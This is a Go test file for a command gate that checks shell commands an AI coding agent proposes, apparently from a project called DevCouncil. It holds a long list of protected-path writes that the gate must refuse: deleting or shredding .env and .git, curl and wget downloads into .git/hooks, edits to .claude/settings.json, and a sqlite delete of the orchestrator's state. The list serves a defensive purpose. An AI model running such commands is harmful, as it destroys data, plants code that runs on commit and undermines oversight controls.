package gate

import (
	"slices"
	"testing"

	"github.com/bharathvbcr/DevCouncil/backend/go_orchestrator/dc"
	"github.com/bharathvbcr/DevCouncil/backend/go_orchestrator/flags"
	"github.com/bharathvbcr/DevCouncil/backend/go_orchestrator/grants"
	"github.com/bharathvbcr/DevCouncil/backend/go_orchestrator/policy"
)

// Every command that writes a protected path through its arguments is refused
// Hard, however the host is configured: under the dev, strict and advisory
// postures, with no task (the taskless host) and under a human grant for the
// command refusal. The rung is the file gate's own verdict on the operand, so
// nothing a posture demotes or a grant clears can reach it.
var w6ProtectedWrites = []string{
	"rm .env",
	"touch .env",
	"truncate -s 0 .env",
	"dd if=/dev/zero of=.env",
	"ln -sf /tmp/x .env",
	"install a .env",
	"curl -o .env http://x/y",
	"curl -fo .env http://x/y",
	"curl -fsSLo.env http://x/y",
	"curl --output .env http://x/y",
	"curl --output=.env http://x/y",
	"curl -O -o .env http://x/y",
	"curl http://x/y --output .env",
	"curl --create-dirs --output-dir .git/hooks -o pre-commit http://x/y",
	"wget -O .env http://x/y",
	"wget -qO .env http://x/y",
	"wget -O.env http://x/y",
	"wget --output-document=.env http://x/y",
	"wget --output-document .env http://x/y",
	"wget -P .git/hooks http://x/pre-commit",
	"perl -pi -e x .env",
	"ruby -pi -e x .env",
	"ruby -i.bak -pe x .env",
	"git checkout -- .env",
	"git checkout HEAD -- .env",
	"git restore .env",
	"git restore --source=HEAD~1 -- .env",
	"git restore -s HEAD -SW -- .env",
	"git checkout main -- .env",
	"rsync a .env",
	"find . -exec cp {} .env +",
	"find . -execdir rm .env ;",
	"echo a | xargs rm .env",
	"rm -rf .git",
	"rm -f .git/index",
	"ln -s /tmp/hook .git/hooks/pre-commit",
	"rm .claude/settings.json",
	"rm ../outside.txt",
	"touch /etc/outside",
	"rmdir .git",
	"unlink .env",
	"shred -u .env",
	"shred -n 3 .env",
	"rm -- .env",
	"rm --force .env",
	"touch -d yesterday .env",
	"touch -r ref .env",
	"git rm .env",
	"git rm -f -- .env",
	"git mv a .env",
	"git clean -fdx .env",
	"git -C . checkout -- .env",
}

func TestEveryArgumentWriteToAProtectedPathIsRefusedHard(t *testing.T) {
	postures := map[string]map[string]string{
		"dev":      {flags.HarnessPosture: flags.PostureDev},
		"strict":   {flags.HarnessPosture: flags.PostureStrict},
		"advisory": {flags.PolicyCommandMode: flags.ModeAdvisory, flags.PolicyFileMode: flags.ModeEnforce},
	}
	task := &dc.Task{
		ID:           "TASK-001",
		PlannedFiles: []dc.PlannedFile{{Path: "src/calc.go", AllowedChange: dc.ChangeModify}},
	}
	check := func(t *testing.T, g *Gate, tk *dc.Task, command string) {
		t.Helper()
		d, err := g.EvaluateCommand(command, tk)
		if err != nil {
			t.Fatalf("EvaluateCommand(%q): %v", command, err)
		}
		if !d.Blocked() || d.Severity != policy.Hard {
			t.Errorf("%q = %s/%s/%s demoted=%q (%s); want a hard denial",
				command, d.Action, d.Rule, d.Severity, d.Demoted, d.Reason)
		}
	}
	for name, overrides := range postures {
		for _, withTask := range []bool{false, true} {
			tk := (*dc.Task)(nil)
			if withTask {
				tk = task
			}
			for _, command := range w6ProtectedWrites {
				g := newGate(t, overrides)
				check(t, g, tk, command)
			}
		}
		// A live human grant for the command refusal clears nothing about the file.
		for _, command := range w6ProtectedWrites {
			g := newGate(t, overrides)
			first, err := g.EvaluateCommand(command, nil)
			if err != nil {
				t.Fatal(err)
			}
			if first.Rule == policy.RuleCommandNotAllowed {
				if _, gErr := g.RequestOverride(first, grants.Grantor{Authority: grants.Human, ID: "operator"}, "w6", ""); gErr != nil {
					continue
				}
			}
			check(t, g, nil, command)
		}
		_ = name
	}
}

// An unmodelled program is asked about every operand. A credential operand is
// refused hard (the credential rung names it command.secret_read, which the
// operand rung does not displace); a restricted or outside-root operand is
// refused hard as unverifiable, with the marker that tells a host the gate
// could not read the line rather than that the line is forbidden.
func TestUnmodelledProgramOperandsAreHardUnderEveryPosture(t *testing.T) {
	postures := map[string]map[string]string{
		"dev":      {flags.HarnessPosture: flags.PostureDev},
		"strict":   {flags.HarnessPosture: flags.PostureStrict},
		"advisory": {flags.PolicyCommandMode: flags.ModeAdvisory, flags.PolicyFileMode: flags.ModeEnforce},
	}
	task := &dc.Task{
		ID:              "TASK-001",
		PlannedFiles:    []dc.PlannedFile{{Path: "src/calc.go", AllowedChange: dc.ChangeModify}},
		AllowedCommands: []string{"sqlite3 *", "mytool *", "go test *", "cat *"},
	}
	for name, overrides := range postures {
		for _, tk := range []*dc.Task{nil, task} {
			for _, command := range []string{
				"sqlite3 .devcouncil/state.sqlite 'delete from tasks'",
				"mytool ../outside.txt",
				"mytool --out=/etc/outside",
				"mytool .git/hooks/pre-commit",
				"mytool .GIT/config",
			} {
				d, err := newGate(t, overrides).EvaluateCommand(command, tk)
				if err != nil {
					t.Fatal(err)
				}
				if !d.Blocked() || d.Severity != policy.Hard || d.Rule != policy.RuleCommandOperandUnverifiable {
					t.Errorf("%s: %q = %s/%s/%s (%s); want hard %s", name, command, d.Action, d.Rule, d.Severity, d.Reason,
						policy.RuleCommandOperandUnverifiable)
				}
				if !slices.Contains(d.Degraded, policy.DegradedUnreadableOnly) {
					t.Errorf("%s: %q lacks the unreadable-only marker: %+v", name, command, d.Degraded)
				}
			}
			for _, command := range []string{"mytool .env", "mytool --token=.env.local"} {
				d, err := newGate(t, overrides).EvaluateCommand(command, tk)
				if err != nil {
					t.Fatal(err)
				}
				if !d.Blocked() || d.Severity != policy.Hard {
					t.Errorf("%s: %q = %s/%s/%s; want a hard refusal of the credential operand", name, command, d.Action, d.Rule, d.Severity)
				}
			}
		}
	}
	for _, command := range []string{"cat README.md", "go test ./..."} {
		d, err := newGate(t, map[string]string{flags.HarnessPosture: flags.PostureStrict}).EvaluateCommand(command, task)
		if err != nil {
			t.Fatal(err)
		}
		if d.Blocked() {
			t.Errorf("%q = %s/%s (%s); a command naming no protected path must be untouched", command, d.Action, d.Rule, d.Reason)
		}
	}
}
